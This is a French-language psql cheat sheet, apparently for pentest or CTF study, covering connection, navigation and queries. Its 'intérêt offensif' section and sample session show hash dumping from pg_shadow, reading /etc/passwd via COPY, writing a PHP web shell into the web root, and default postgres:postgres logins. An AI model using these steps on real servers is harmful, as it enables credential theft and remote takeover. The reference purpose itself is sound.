# psql — cheat sheet

> Client en ligne de commande pour PostgreSQL.

---

## connexion

```bash
psql -h IP -p 5432 -U postgres                          # connexion standard
psql -h IP -p 5432 -U postgres -d mabase               # connexion directe à une base
PGPASSWORD=postgres psql -h IP -p 5432 -U postgres      # mot de passe en variable d'env
psql postgresql://postgres:postgres@IP:5432             # URI complète
psql postgresql://postgres:postgres@IP:5432/mabase      # URI avec base
```

---

## navigation — les essentiels

```sql
\l                          -- lister toutes les bases
\c nom_base                 -- se connecter à une base
\dt                         -- lister les tables de la base courante
\dt *.*                     -- lister toutes les tables de tous les schémas
\d nom_table                -- voir la structure d'une table
\dn                         -- lister les schémas
\du                         -- lister les utilisateurs et leurs rôles
\df                         -- lister les fonctions
\dv                         -- lister les vues
\conninfo                   -- infos sur la connexion courante
\q                          -- quitter
```

---

## lire les données

```sql
SELECT * FROM nom_table;                          -- tout le contenu
SELECT * FROM nom_table LIMIT 10;                 -- 10 premières lignes
SELECT colonne1, colonne2 FROM nom_table;         -- colonnes spécifiques
SELECT * FROM nom_table WHERE colonne='valeur';   -- avec filtre
SELECT COUNT(*) FROM nom_table;                   -- compter les lignes
```

---

## informations système

```sql
SELECT version();                                 -- version PostgreSQL
SELECT current_user;                              -- utilisateur courant
SELECT current_database();                        -- base courante
SELECT datname FROM pg_database;                  -- toutes les bases
SELECT tablename FROM pg_tables WHERE schemaname='public';  -- tables publiques
SELECT usename, passwd FROM pg_shadow;            -- users et hashes (superuser requis)
SELECT * FROM pg_user;                            -- infos utilisateurs
SELECT * FROM information_schema.tables;          -- toutes les tables
```

---

## intérêt offensif

```sql
-- récupérer les hashes des utilisateurs PostgreSQL
SELECT usename, passwd FROM pg_shadow;

-- voir les droits
SELECT * FROM information_schema.role_table_grants;

-- lire un fichier système (superuser requis)
COPY (SELECT '') TO '/tmp/test.txt';
CREATE TABLE tmp (data text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;

-- écrire un fichier (persistance)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- exécuter une commande système (si extension installée)
SELECT system('id');
```

---

## différences MySQL vs PostgreSQL

| action | MySQL | PostgreSQL |
|--------|-------|-----------|
| lister les bases | `SHOW DATABASES;` | `\l` |
| sélectionner une base | `USE nom;` | `\c nom` |
| lister les tables | `SHOW TABLES;` | `\dt` |
| décrire une table | `DESCRIBE table;` | `\d table` |
| quitter | `\q` ou `exit` | `\q` |
| users et hashes | `SELECT * FROM mysql.user;` | `SELECT usename, passwd FROM pg_shadow;` |

---

## affichage

```sql
\x                          -- mode étendu (vertical) — équivalent de \G en MySQL
\x on                       -- activer le mode étendu
\x off                      -- désactiver
\timing                     -- afficher le temps d'exécution
\pset pager off             -- désactiver le pager (plus de "q" pour quitter)
```

---

## exemples de session complète

```bash
# connexion
PGPASSWORD=postgres psql -h 192.168.1.10 -p 5432 -U postgres

# dans psql
\l                          -- lister les bases
\c mabase                   -- sélectionner une base
\dt                         -- voir les tables
\d users                    -- structure de la table users
SELECT * FROM users;        -- contenu
SELECT usename, passwd FROM pg_shadow;  -- hashes des users PostgreSQL
\q                          -- quitter
```